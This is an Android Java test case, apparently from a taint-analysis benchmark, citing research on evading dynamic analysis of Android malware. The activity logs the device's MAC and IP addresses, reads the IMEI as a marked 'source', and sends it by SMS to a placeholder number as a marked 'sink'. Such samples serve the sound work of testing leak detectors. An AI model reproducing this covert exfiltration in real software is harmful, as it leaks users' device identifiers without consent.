
package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.format.Formatter;
import android.util.Log;
/**
 * @testcase_name Network1
 * Practically the same from netH.patch
 * Rage Against the Virtual Machine: Hindering Dynamic Analysis of Android Malware. Thanasis Petsas et al.
 */
public class Network1 extends Activity {
	
	@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d("IBM", "start");
        setContentView(R.layout.network1);
        /*
        WifiManager wm = (WifiManager) getSystemService(WIFI_SERVICE);
        @SuppressWarnings("deprecation")
		String ip = Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress());
        Log.d("IBM", "IP: "+ip);
        */
        
        Log.d("IBM","->"+Utils.getMACAddress("wlan0"));
        Log.d("IBM","->"+Utils.getMACAddress("eth0") );
        Log.d("IBM","->"+Utils.getIPAddress(true)    ); // IPv4
        Log.d("IBM","->"+Utils.getIPAddress(false    )); // IPv6 
        String imei = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId(); //source

    	SmsManager sms = SmsManager.getDefault();
		Log.d("IBM", "sending SMS: "+imei);
		sms.sendTextMessage("+49 1234", null, imei, null, null);  //sink
		Log.d("IBM", "end");
    }
}
